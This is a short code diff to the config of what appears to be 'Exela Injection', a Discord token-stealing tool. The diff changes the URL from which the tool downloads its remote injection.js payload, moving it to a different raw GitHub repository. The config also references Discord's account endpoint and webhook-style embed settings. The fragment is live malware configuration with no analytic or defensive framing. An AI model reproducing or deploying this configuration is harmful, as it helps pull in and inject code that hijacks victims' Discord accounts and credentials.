@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Exela Injection', 
   embed_icon: 'https://i.pinimg.com/736x/f7/64/35/f764353161c04a66fb31e99dfa2bc29c.jpg', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/CyberPiratHacks/ForBlackkRose/refs/heads/main/injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
